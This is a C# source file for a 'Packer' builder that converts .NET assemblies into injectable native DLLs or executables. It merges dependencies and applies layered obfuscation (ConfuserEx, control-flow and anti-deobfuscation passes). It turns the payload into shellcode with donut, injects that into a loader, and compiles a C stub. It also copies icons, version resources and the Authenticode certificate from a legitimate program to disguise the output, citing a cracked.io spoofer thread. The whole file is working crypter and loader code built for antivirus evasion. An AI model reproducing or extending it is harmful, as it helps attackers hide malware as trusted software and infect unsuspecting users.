using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using MassCloner;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace NETBuilderInjection.Core
{
    public class Packer
    {
        public string BuildPath = string.Empty;

        public object BuilderTask = null;

        private string AssemblyTarget = string.Empty;

        private ModuleDefMD AssemblyModule = null;
        private InjectionEntryPoint BuildConfig = new InjectionEntryPoint();
        private MethodDef EntryPointMethod = null;
        ModuleDefMD Loader = null;

        public Packer(String assembly)
        {
            AssemblyTarget = assembly;

        }

        public bool Load()
        {

            CustomAttribute InjAttribute = null;

            MethodDef EntryMethod = GetEntryPointWithAttr(AssemblyModule, out InjAttribute);

            if (EntryMethod == null) { return false; }
            else
            {

                try
                {
                    //Setup Config parameters 
                    CANamedArgument InjAtributo = InjAttribute.GetProperty("CreateThread"); if (InjAtributo != null) { BuildConfig.CreateThread = (bool)InjAtributo.Value; }

                    CANamedArgument BuildFormatAtrrib = InjAttribute.GetProperty("BuildTarget"); if (BuildFormatAtrrib != null) { BuildConfig.BuildTarget = BuildFormatAtrrib.Value.ToString(); }

                    CANamedArgument MergeAtrrib = InjAttribute.GetProperty("MergeLibs"); if (MergeAtrrib != null) { BuildConfig.MergeLibs = (bool)MergeAtrrib.Value; }

                    CANamedArgument ILoaderAtrrib = InjAttribute.GetProperty("ILoader"); if (ILoaderAtrrib != null) { BuildConfig.ILoader = (bool)ILoaderAtrrib.Value; }

                    CANamedArgument ProtectRulesAtrrib = InjAttribute.GetProperty("ProtectionRules"); if (ProtectRulesAtrrib != null) { BuildConfig.ProtectionRules = ProtectRulesAtrrib.Value.ToString(); }

                    CANamedArgument PreCompilerAtrrib = InjAttribute.GetProperty("PreCompiler"); if (PreCompilerAtrrib != null) { BuildConfig.PreCompiler = PreCompilerAtrrib.Value.ToString(); }

                    CANamedArgument CloneToAtrrib = InjAttribute.GetProperty("CloneTo"); if (CloneToAtrrib != null) { BuildConfig.CloneTo = CloneToAtrrib.Value.ToString(); }

                    CANamedArgument ILoaderProtectionRulesAtrrib = InjAttribute.GetProperty("ILoaderProtectionRules"); if (ILoaderProtectionRulesAtrrib != null) { BuildConfig.ILoaderProtectionRules = ILoaderProtectionRulesAtrrib.Value.ToString(); }

                    CANamedArgument BasicILoaderProtectionAtrrib = InjAttribute.GetProperty("BasicILoaderProtection"); if (BasicILoaderProtectionAtrrib != null) { BuildConfig.BasicILoaderProtection = (bool)BasicILoaderProtectionAtrrib.Value; }

                }
                catch (Exception ex) { }

                EntryPointMethod = EntryMethod;


                if (BuildPath == string.Empty)
                {

                    string TempNameAssembly = Path.GetFileNameWithoutExtension(AssemblyTarget) + ".exported" + BuildConfig.BuildTarget;
                    string TempAssembly = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(AssemblyTarget), TempNameAssembly);
                    BuildPath = TempAssembly;
                    try { if (File.Exists(BuildPath) == true) { File.Delete(BuildPath); } } catch { }
                }

                return true;
            }

        }

        public bool IsValidAssembly()
        {

            ModuleDefMD tempAssemblyModule = ModuleDefMD.Load(AssemblyTarget);

            if (tempAssemblyModule != null || tempAssemblyModule.IsILOnly == true)
            {
                AssemblyModule = tempAssemblyModule;

                return true;
            }

            return false;
        }

        public bool Build(string Compiler, string LibzMerger, string StubDir, string Protector)
        {

            string CurrentClipData = Clipboard.GetText();

            string TempNameAssembly = Path.GetFileNameWithoutExtension(AssemblyTarget) + ".exported" + BuildConfig.BuildTarget;
            string TempDirEx = System.IO.Path.Combine(System.IO.Path.GetTempPath(), Path.GetFileNameWithoutExtension(AssemblyTarget));


            string TempAssembly = System.IO.Path.Combine(TempDirEx, TempNameAssembly);

            try
            {
                if (Directory.Exists(TempDirEx) == true) { Directory.Delete(TempDirEx, true); }
                Directory.CreateDirectory(TempDirEx);
            }
            catch (Exception ex) { return true; }

            #region " Merger "

            List<string> AllLibs = GetLibsToMergedRecursive(AssemblyModule, Path.GetDirectoryName(AssemblyTarget));

            if (BuildConfig.MergeLibs == false)
            {
                Log("Writing Assembly...");
                try
                {

                    AssemblyModule.Kind = ModuleKind.Dll;

                    EntryPointMethod.ExportInfo = new MethodExportInfo();
                    EntryPointMethod.IsUnmanagedExport = true;

                    ModuleWriterOptions opts = new ModuleWriterOptions(AssemblyModule);
                    opts.Cor20HeaderOptions.Flags = 0;
                    AssemblyModule.Write(TempAssembly, opts);
                }
                catch (Exception ex) { return true; }

            }
            else
            {
                Log("Mergin Assembly...");
                try
                {
                    CustomAttribute InjAttribute;
                    File.Copy(AssemblyTarget, TempAssembly, true);

                    foreach (string LibsToMerged in AllLibs)
                    {
                        string TempLibDLL = Path.Combine(TempDirEx, Path.GetFileName(LibsToMerged));
                        if (File.Exists(TempLibDLL) == true) { File.Delete(TempLibDLL); }
                        File.Copy(LibsToMerged, TempLibDLL, true);
                    }


                    string TempLibz = Path.Combine(TempDirEx, Path.GetFileName(LibzMerger));
                    if (File.Exists(TempLibz) == false) { File.Copy(LibzMerger, TempLibz, true); }
                    string TargetAsmName = Path.GetFileName(TempAssembly);

                    //Log.LogWarning("[RUNNING] Libz Merger  -> " + TempLibz);

                    string FullLibzArgs = $"inject-dll --assembly {TargetAsmName} --include *.dll --exclude {TargetAsmName} --move";

                    //File.WriteAllText(Path.Combine(TempDirEx, "test.bat"), "libz.exe " + FullLibzArgs);

                    string LibzResult = RunRemoteHost(TempLibz, FullLibzArgs);


                    if (LibzResult.Contains("FileNotFoundException") || LibzResult.Contains("ArgumentException")) { return true; }

                    if (BuildConfig.ILoader == false)
                    {

                        Log("Writing Assembly...");

                        if (AssemblyModule != null) { AssemblyModule.Dispose(); AssemblyModule = null; };

                        try { AssemblyModule = ModuleDefMD.Load(File.ReadAllBytes(TempAssembly)); } catch (Exception ex) { return false; }

                        EntryPointMethod = GetEntryPointWithAttr(AssemblyModule, out InjAttribute);

                        AssemblyModule.Kind = ModuleKind.Dll;

                        EntryPointMethod.ExportInfo = new MethodExportInfo();
                        EntryPointMethod.IsUnmanagedExport = true;

                        ModuleWriterOptions opts = new ModuleWriterOptions(AssemblyModule);
                        opts.Cor20HeaderOptions.Flags = 0;
                        AssemblyModule.Write(TempAssembly, opts);
                    }

                }
                catch (Exception ex) { return true; }


            }


            #endregion

            #region " Prepare Loader "

            ModuleWriterOptions options = new ModuleWriterOptions(AssemblyModule);
            string LoaderPathEx = string.Empty;

            if (BuildConfig.ILoader == true)
            {
                Log("Creating Loader...");
                LoaderPathEx = PrepareLoader(TempDirEx, options);
            }

            #endregion

            #region " PreCompiler "

            try
            {
                string PreCompiler = BuildConfig.PreCompiler;
                if (PreCompiler != string.Empty)
                {
                    Log("Executing PreCompiler...");

                    if (File.Exists(PreCompiler) == true)
                    {

                        string PreCompilerResult = RunRemoteHost(PreCompiler, TempAssembly);

                        Log("[PreCompiler] " + PreCompilerResult);


                    }
                    else { Log("PreCompiler Dont Exists!"); return true; }

                }
            }
            catch (Exception ex) { return true; }

            #endregion

            #region " Protect "

            try
            {
                Log("Rules Protector.  " + BuildConfig.ProtectionRules);
                if (BuildConfig.ProtectionRules != string.Empty)
                {
                    Log("Starting Protector...");

                    foreach (string LibsToMerged in AllLibs)
                    {
                        string TempLibDLL = Path.Combine(TempDirEx, Path.GetFileName(LibsToMerged));
                        if (File.Exists(TempLibDLL) == true) { File.Delete(TempLibDLL); }
                        File.Copy(LibsToMerged, TempLibDLL, true);
                    }

                    string Config = @"<project outputDir=""$out$"" baseDir=""$in$"" xmlns=""http://confuser.codeplex.com"">
    $RULES$
    <module path=""$filename$"" />
</project>
";


                    Config = Config.Replace("$out$", Path.GetDirectoryName(TempAssembly));
                    Config = Config.Replace("$in$", Path.GetDirectoryName(TempAssembly));
                    Config = Config.Replace("$filename$", Path.GetFileName(TempAssembly));
                    Config = Config.Replace("$RULES$", BuildConfig.ProtectionRules);

                    string ConfigTempFile = Path.Combine(TempDirEx, "ConfigTemp.crproj");
                    if (File.Exists(ConfigTempFile) == true) { File.Delete(ConfigTempFile); }

                    File.WriteAllText(ConfigTempFile, Config);

                    string LizProtectResult = RunRemoteHost(Protector, "-n " + ConfigTempFile);

                    Log("[Protector] " + LizProtectResult);

                }

            }
            catch (Exception ex) { return true; }

            #endregion

            string EntryPointName = EntryPointMethod.Name;
            TypeDef MethodType = EntryPointMethod.DeclaringType;
            string ClassRoot = MethodType.FullName;

            if (AssemblyModule != null) { AssemblyModule.Dispose(); AssemblyModule = null; };

            #region " PE Clonner "

            bool PEClon = Clonner(BuildConfig.CloneTo, TempAssembly);
            Log("Clonning Result: " + PEClon);

            #endregion

            #region " ILoader "
            if (BuildConfig.ILoader == true)
            {

                Log("Building Loader");


                string Donut = Path.Combine(TempDirEx, "donut.exe");
                File.WriteAllBytes(Donut, NETBuilderInjection.Properties.Resources.donut);


                string TempShell = Path.Combine(TempDirEx, "loader.b64");
                if (File.Exists(TempShell) == true) { File.Delete(TempShell); }

                string TargetAsmName = Path.GetFileName(TempAssembly);

                string FullDonutArgs = $"-f 2 -c {ClassRoot} -m {EntryPointName} --input:{TargetAsmName}";

                string DonutResult = RunRemoteHost(Donut, FullDonutArgs);

                Log("Donut : " + DonutResult);

                string ShellCode = string.Empty;

                if (File.Exists(TempShell) == true) { ShellCode = File.ReadAllText(TempShell); }

                if (ShellCode == string.Empty) { return true; }

                Log("Loader Status : " + File.Exists(LoaderPathEx));

                ModuleDefMD ILoaderModule = null;

                try { ILoaderModule = ModuleDefMD.Load(File.ReadAllBytes(LoaderPathEx)); } catch (Exception ex) { return false; }

                if (ILoaderModule == null) { Log("Loader Failed... :("); return false; }

                MethodDef IloaderMethod = InjectShellcode(ILoaderModule, "Load", ShellCode);

                if (IloaderMethod == null) { Log("Loader Inject Failed... :("); return false; }

                if (BuildConfig.BasicILoaderProtection == true)
                {

                    MindLated.Protection.CtrlFlow.ControlFlowObfuscation.Execute(ILoaderModule);
                    kov.NET.Protections.VariableMover.Execute(ILoaderModule);
                    Junkfuscator.Core.Protections.Mutations.MutationExecute(ILoaderModule);
                    MindLated.Protection.INT.AddIntPhase.Execute2(ILoaderModule);
                    Junkfuscator.Core.Protections.AntiDe4Dot.Execute(ILoaderModule);
                    Junkfuscator.Core.Protections.ClassAndMethods.Execute(ILoaderModule);

                }

                ILoaderModule.Kind = ModuleKind.Dll;

                IloaderMethod.ExportInfo = new MethodExportInfo();
                IloaderMethod.IsUnmanagedExport = true;

                ModuleWriterOptions opts = new ModuleWriterOptions(ILoaderModule);
                opts.Cor20HeaderOptions.Flags = 0;
                ILoaderModule.Write(TempAssembly, opts);

                EntryPointName = IloaderMethod.Name;

                Log("ILoaderModule Writed!! ");

                if (ILoaderModule != null) { ILoaderModule.Dispose(); ILoaderModule = null; };

                bool ILoaderClon = Clonner(BuildConfig.CloneTo, TempAssembly);

                if (BuildConfig.ILoaderProtectionRules != string.Empty)
                {

                    string Config = @"<project outputDir=""$out$"" baseDir=""$in$"" xmlns=""http://confuser.codeplex.com"">
    $RULES$
    <module path=""$filename$"" />
</project>
";

                    Config = Config.Replace("$out$", Path.GetDirectoryName(TempAssembly));
                    Config = Config.Replace("$in$", Path.GetDirectoryName(TempAssembly));
                    Config = Config.Replace("$filename$", Path.GetFileName(TempAssembly));
                    Config = Config.Replace("$RULES$", BuildConfig.ILoaderProtectionRules);

                    string ConfigTempFile = Path.Combine(TempDirEx, "ConfigTemp2.crproj");
                    if (File.Exists(ConfigTempFile) == true) { File.Delete(ConfigTempFile); }

                    File.WriteAllText(ConfigTempFile, Config);

                    string LizProtectResult = RunRemoteHost(Protector, "-n " + ConfigTempFile);

                }

               

            }
            #endregion

            #region " C Compiler "
            string TCC_Args = "";

            System.Text.StringBuilder StringMemory = new System.Text.StringBuilder();
            byte[] FileBytes;

            try
            {

                Log("Running Tcc Compiler!! ");
                using (FileStream Input = new FileStream(TempAssembly, FileMode.Open, FileAccess.Read))
                {

                    using (BinaryReader Reader = new BinaryReader(Input))
                    {

                        FileBytes = Reader.ReadBytes(System.Convert.ToInt32(Input.Length));

                        List<string> ListHexStr = HexEncoding.GetString(FileBytes); // Core.Utils.BytesToHex(FileBytes)

                        int MaxStr = 0;
                        string Separator = ", ";
                        int IntCount = 0;
                        foreach (string HexByte in ListHexStr)
                        {
                            if (MaxStr == ListHexStr.Count)
                                Separator = string.Empty;
                            if (IntCount >= 20)
                            {
                                StringMemory.Append("0x" + HexByte + Separator + Environment.NewLine);
                                IntCount = 0;
                            }
                            else
                            {
                                StringMemory.Append("0x" + HexByte + Separator);
                                IntCount += 1;
                            }
                            MaxStr += 1;
                        }


                    }

                }

                Log("Writting Stub.c File...");

                string StubStr = File.ReadAllText(StubDir);

                StubStr = StubStr.Replace("$DataLength$", FileBytes.Length.ToString());
                StubStr = StubStr.Replace("$DataByte$", StringMemory.ToString());
                StubStr = StubStr.Replace("$DllName$", TempNameAssembly);
                StubStr = StubStr.Replace("$DllMain$", EntryPointName);
                StubStr = StubStr.Replace("$AsyncThread$", BuildConfig.CreateThread.ToString().ToLower());


                if (BuildConfig.BuildTarget.ToLower() != ".exe") { TCC_Args = " -shared"; } else { StubStr = StubStr.Replace("Conditional = false", "Conditional = true"); }

                string StubTempFile = Path.Combine(TempDirEx, "StubTemp.c");
                if (File.Exists(StubTempFile) == true) { File.Delete(StubTempFile); }

                File.WriteAllText(StubTempFile, StubStr);

                string FullArguments = "\"" + StubTempFile + "\"" + TCC_Args + " -o " + "\"" + BuildPath + "\"";
                string TccResult = RunRemoteHost(Compiler, FullArguments);

                Log("[DEBUG] " + TccResult);

            }
            catch (Exception ex) { }
            #endregion

            #region " Dispose and Clean "
            //try { if (Directory.Exists(TempDirEx) == true) { Directory.Delete(TempDirEx, true); } }
            //catch (Exception ex) { }

            try { Clipboard.SetText(CurrentClipData); } catch { }
            #endregion


            return true;

        }

        private bool Clonner(string Source, string Target)
        {
            // https://cracked.io/Thread-%E2%9A%A1-SOURCE-CODE-C-Executable-Spoofer-%E2%9A%A1
            try
            {
                if (File.Exists(Source) == true)
                {
                    CloneResources(Source, Target);
                    CloneCertificate(Source, Target);
                }
                else { Log("Cloning Source Dont Exists!"); return false; }
            }
            catch (Exception ex) { Log("Cloning Error: " + ex.Message); return false; }

            return true;
        }

        private string PrepareLoader(string FolderDir, ModuleWriterOptions Opts)
        {

            string LoaderPath = System.IO.Path.Combine(FolderDir, "ILoader.dll");

            Loader = ModuleDefMD.Load(NETBuilderInjection.Properties.Resources.lLoader);
            Loader.Write(LoaderPath, Opts);
            Loader.Dispose();

            return LoaderPath;
        }

        private MethodDef GetEntryPointWithAttr(ModuleDefMD asm, out CustomAttribute InjectionAtrribute)
        {

            MethodDef MethodEntryPoint = null;
            CustomAttribute InjAttribute = null;

            IEnumerable<TypeDef> TypesClass = asm.GetTypes();

            foreach (TypeDef Classes in TypesClass)
            {
                IList<MethodDef> MethodList = Classes.Methods;

                foreach (MethodDef Method in MethodList)
                {
                    try
                    {
                        if (Method.CustomAttributes != null && Method.CustomAttributes.Count >= 1)
                        {

                            CustomAttribute InjAtributo = Method.CustomAttributes.FirstOrDefault(attr => attr.AttributeType.Name == "InjectionEntryPoint");

                            if (Method.IsStatic == true && InjAtributo != null)
                            {

                                MethodEntryPoint = Method;
                                InjAttribute = InjAtributo;
                                break;
                            }
                        }
                    }
                    catch (Exception ex) { } //Log.LogWarning(ex.Message);
                }
                if (MethodEntryPoint != null) { break; }
            }

            InjectionAtrribute = InjAttribute;
            return MethodEntryPoint;

        }

        private List<string> GetLibsToMergedRecursive(ModuleDef ASM, string WorkingDir)
        {
            List<string> Result = new List<string>();

            foreach (AssemblyRef ModEx in ASM.GetAssemblyRefs())
            {
                try
                {
                    Log("Target Merger -> " + ModEx.Name + ".dll");

                    string RelativePath = Path.Combine(WorkingDir, ModEx.Name + ".dll");
                    if (File.Exists(RelativePath) == true)
                    {
                        ModuleDef IsLoadPosibility = ModuleDefMD.Load(RelativePath);
                        Log("IsLoadPosibility -> " + IsLoadPosibility);
                        if (IsLoadPosibility.IsILOnly == true)
                        {
                            Result.Add(RelativePath);
                            List<string> OtherLibs = GetLibsToMergedRecursive(IsLoadPosibility, WorkingDir);
                            if (OtherLibs.Count != 0) { Result.AddRange(OtherLibs); }
                        }
                        IsLoadPosibility.Dispose();
                    }
                }
                catch (Exception ex) { }
            }



            return Result;
        }

        private string RunRemoteHost(string tcc, string FullArguments = "")
        {
            try
            {

                Process cmdProcess = new Process();
                {
                    var withBlock = cmdProcess;
                    withBlock.StartInfo = new ProcessStartInfo(tcc, FullArguments);
                    {
                        var withBlock1 = withBlock.StartInfo;
                        withBlock1.CreateNoWindow = true;
                        withBlock1.UseShellExecute = false;
                        withBlock1.RedirectStandardOutput = true;
                        withBlock1.RedirectStandardError = true;
                        withBlock1.WorkingDirectory = Path.GetDirectoryName(tcc);
                    }
                    withBlock.Start();
                    withBlock.WaitForExit();
                }

                string HostOutput = cmdProcess.StandardOutput.ReadToEnd().ToString() + Environment.NewLine + cmdProcess.StandardError.ReadToEnd().ToString();

                return HostOutput.ToString();
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        private MethodDef InjectShellcode(ModuleDefMD module, string MethodName, string shellcode)
        {
            MethodDef Result = null;
            IEnumerable<TypeDef> TypesClass = module.GetTypes();

            foreach (TypeDef Classes in TypesClass)
            {
                IList<MethodDef> MethodList = Classes.Methods;

                foreach (MethodDef Method in MethodList)
                {
                    try
                    {

                        if (Method.IsStatic == true && Method.Name == MethodName)
                        {

                            foreach (Instruction Ins in Method.Body.Instructions)
                            {


                                if (Ins.Operand is string)
                                {
                                    string type = (string)Ins.Operand;
                                    if (type == "ShellCode")
                                    {
                                        Ins.Operand = shellcode;
                                    }
                                }

                            }

                            Result = Method;

                        }


                        if (Result != null) { break; }
                    }
                    catch (Exception ex) { } //Log.LogWarning(ex.Message);
                }

            }

            return Result;
        }

        public void Log(string msg) { if (BuilderTask != null) { BuilderTask BuilderTaskEx = (BuilderTask)BuilderTask; BuilderTaskEx.Log.LogWarning(msg); } else { Console.WriteLine(msg); } }


        /// <summary>
        /// Clone details including icons, manifest, version details
        /// </summary>
        static void CloneResources(string sourcefile, string targetfile)
        {
            var source = new ResourceEditor(sourcefile);
            var target = new ResourceEditor(targetfile);
            var resources = source.GetResources(MassCloner.ResourceType.RT_GROUP_ICON,
                                                MassCloner.ResourceType.RT_ICON,
                                                MassCloner.ResourceType.RT_VERSION,
                                                MassCloner.ResourceType.RT_MANIFEST,
                                                MassCloner.ResourceType.RT_GROUP_CURSOR);
            target.SetResources(resources);
        }

        /// <summary>
        /// Clone certificate
        /// </summary>
        static void CloneCertificate(string sourcefile, string targetfile)
        {
            var address = default(uint);
            var size = default(uint);
            var certificate = default(byte[]);

            using (var file = new FileStream(sourcefile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (var reader = new BinaryReader(file))
                {

                    reader.BaseStream.Seek(0x3c, SeekOrigin.Begin);
                    var e_lfanew = reader.ReadUInt32();

                    reader.BaseStream.Seek(e_lfanew + 0x18, SeekOrigin.Begin);
                    var high = reader.ReadUInt16() == 0x20b;

                    var offset = high ? 0xa8 : 0x98;
                    reader.BaseStream.Seek(e_lfanew + offset, SeekOrigin.Begin);

                    address = reader.ReadUInt32();
                    size = reader.ReadUInt32();
                    certificate = new byte[size];

                    reader.BaseStream.Seek(address, SeekOrigin.Begin);
                    reader.Read(certificate, 0, (int)size);
                }
            }

            if (address == 0 || size == 0)
                return;

            using (var file = new FileStream(targetfile, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                using (var reader = new BinaryReader(file))
                using (var writer = new BinaryWriter(file))
                {
                    writer.BaseStream.Seek(0, SeekOrigin.End);
                    address = (uint)writer.BaseStream.Position;
                    writer.Write(certificate, 0, certificate.Length);

                    writer.BaseStream.Seek(0x3c, SeekOrigin.Begin);
                    var e_lfanew = reader.ReadUInt32();

                    reader.BaseStream.Seek(e_lfanew + 0x18, SeekOrigin.Begin);
                    var high = reader.ReadUInt16() == 0x20b;

                    var offset = high ? 0xa8 : 0x98;

                    writer.BaseStream.Seek(e_lfanew + offset, SeekOrigin.Begin);
                    writer.Write(address);
                    writer.Write(size);
                }
            }
        }

    }
}
